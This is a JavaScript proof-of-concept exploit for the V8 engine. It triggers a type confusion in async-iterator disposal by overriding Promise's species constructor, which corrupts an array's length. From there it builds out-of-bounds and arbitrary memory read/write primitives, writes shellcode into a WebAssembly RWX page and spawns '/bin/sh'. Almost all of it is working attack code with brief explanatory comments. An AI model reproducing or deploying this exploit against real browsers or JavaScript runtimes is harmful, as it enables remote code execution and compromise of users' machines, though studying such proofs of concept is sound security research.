// set args --allow-natives-syntax --shell poc.js
function assert(val) {
  if (!val) {
    throw "Assertion Failed";
  }
}

// function dp(x){ %DebugPrint(x); }
// function bp() { %SystemBreak(); }

class Helpers {
  constructor() {
    this.buf = new ArrayBuffer(0x100);
    this.dv = new DataView(this.buf);
    this.u8 = new Uint8Array(this.buf);
    this.u32 = new Uint32Array(this.buf);
    this.u64 = new BigUint64Array(this.buf);
    this.f32 = new Float32Array(this.buf);
    this.f64 = new Float64Array(this.buf);
    this.index = 0;
  }

  ptof(p1, p2) {
    this.u32[0] = p1;
    this.u32[1] = p2;
    return this.f64[0];
  }

  itof(i) {
    this.u64[0] = i;
    return this.f64[0];
  }

  ftoi(f) {
    this.f64[0] = f;
    return this.u64[0];
  }

  set_i64(i) {
    this.u64[0] = i;
  }

  set_l(i) {
    this.u32[0] = i;
  }

  set_h(i) {
    this.u32[1] = i;
  }

  get_i64() {
    return this.u64[0];
  }

  ftoil(f) {
    this.f64[0] = f;
    return this.u32[0];
  }

  ftoih(f) {
    this.f64[0] = f;
    return this.u32[1];
  }

  mark_sweep_gc() {
    new ArrayBuffer(0x7fe00000);
  }
}

let h = new Helpers();

function hex(val){
    return '0x' + (typeof val === 'bigint' ? val : h.ftoi(val)).toString(16);
}

function dump(arr, len) {
  for (let i = 0; i < len; i++) {
    console.log("arr[" + i + "] = " + hex(arr[i]));
  }
}

async function* generator() {
    yield 1;
}
const gen = generator();   

/* 
    heap spray, The heap layout of corrupted_arr is as follows
                        +------------+------------+
             JSArray => |    map     | properties |
                        +------------+------------+ 
                        |  elemetns  |   length   |
                        +------------+------------+
    FixedDoubleArray => |    map     |   length   |
                        +------------+------------+
                        |        values[0]        |
                        +-------------------------+
*/
let heap_spray = [];
for(let i=0; i<50; i++) {
    heap_spray.push([1.1]);
}
let corrupted_arr = heap_spray[10];
var obj = {"A":1};
var obj_arr = [obj, obj];

function MyConstructor(executor) {
    function myResolve(value) {
        ;
    }
    function myReject(err) {
        ;
    }
    executor(myResolve, myReject);

    /*
        In AsyncIteratorPrototypeAsyncDispose()
            1. The returned corrupted_arr here will be treated as the return value of promise::PromiseResolve(constructor, result);
            2. Then it is forcibly converted to a JSPromise object through UnsafeCast<JSPromise>(resultWrapper)
            3. Enter the PerformPromiseThenImpl() method to execute resultWrapper.then(...)
    */
    return corrupted_arr;
}

// When a Promise object needs to be derived (for example, in the then method), 
// MyConstructor will be used as the construction method to create objects
Object.defineProperty(Promise, Symbol.species, {
    "value": MyConstructor
});

/*
    Trigger AsyncIteratorPrototypeAsyncDispose
    During processing, this method will confuse corrupted_arr as a JSPromise object
*/
gen[Symbol.asyncDispose]();

// job(corrupted_arr)->length has been corrupted to the pointer of the PromiseReaction object
// Unusually large, can freely implement out-of-bounds read and write
oob_arr = corrupted_arr;
// console.log("corrupted_arr length:", corrupted_arr.length);
dump(corrupted_arr, 250);

oob_arr_map = h.itof((h.ftoi(oob_arr[1])) & 0xffffffffn);
obj_arr_map = h.itof((h.ftoi(oob_arr[234]) >> 32n) & 0xffffffffn);
console.log('[*] oob_arr map address leaked:', hex(oob_arr_map));
console.log('[*] obj_arr map address leaked:', hex(obj_arr_map));

function addrOf(obj) {
    obj_arr[0] = obj;
    oob_arr[234] = h.itof(h.ftoi(oob_arr_map) << 32n);
    let addr = Number(h.ftoi(obj_arr[0]) & 0xffffffffn);
    oob_arr[234] = h.itof(h.ftoi(obj_arr_map) << 32n);
    return BigInt(addr);
}

function fakeObj(addr) {
    oob_arr[233] = h.ptof(0x4, Number(addr)); // fake element addr
    oob_arr[234] = h.itof(h.ftoi(obj_arr_map) << 32n); //obj_arr map
    let fake = obj_arr[0];
    return fake;
}

var arb_rw_arr = [(oob_arr_map), 1.2, 1.3, 1.4];

console.log('[*] arb_rw_arr address:', hex(addrOf(arb_rw_arr)));
// dp(arb_rw_arr);

console.log("[*] Result: 0x" + arb_read(addrOf(arb_rw_arr)).toString(16));
// dp(arb_rw_arr)

function arb_read(addr) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = h.itof(0x8n << 32n) + h.itof(addr - 0x8n);
    return h.ftoi(fake[0]);
}

function arb_write(addr, val) {
    if (addr % 2n == 0)
        addr += 1n;

    let fake = fakeObj(addrOf(arb_rw_arr) - 0x20n);
    arb_rw_arr[1] = h.itof(0x8n << 32n) + h.itof(addr - 0x8n);
    fake[0] = h.itof(val);
}

function copy(addr, data_arr) {
    let dataview = h.dv;
    let buf_addr = addrOf(h.buf);
    let backing_store_addr = buf_addr - 1n + 0x24n;
    arb_write(backing_store_addr, addr);

    for (let i = 0; i < data_arr.length; i++) {
        dataview.setBigUint64(8*i, data_arr[i], true);
    }
}

function execute_shellcode(shellcode){
  var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
  var wasm_mod = new WebAssembly.Module(wasm_code);
  var wasm_instance = new WebAssembly.Instance(wasm_mod);
  var f = wasm_instance.exports.main;
  // dp(wasm_instance)
  var wasm_trusted_data = arb_read(addrOf(wasm_instance) + 0x8n) >> 32n;
  // console.log("[+] trusted data: " + hex(wasm_trusted_data));
  var rwx = arb_read(wasm_trusted_data + 0x28n);
  // console.log('[*] wasm rwx address:', hex(rwx));
  copy(rwx, shellcode);
  f();
}

var shellcode = [
        0x010101010101b848n,
        0x68632eb848500101n,
        0x0431480169722e6fn,
        0xf631d231e7894824n,
        0x050f583b6an,
];


console.log("[+] executing execve('/bin/sh', 0, 0)");
execute_shellcode(shellcode);
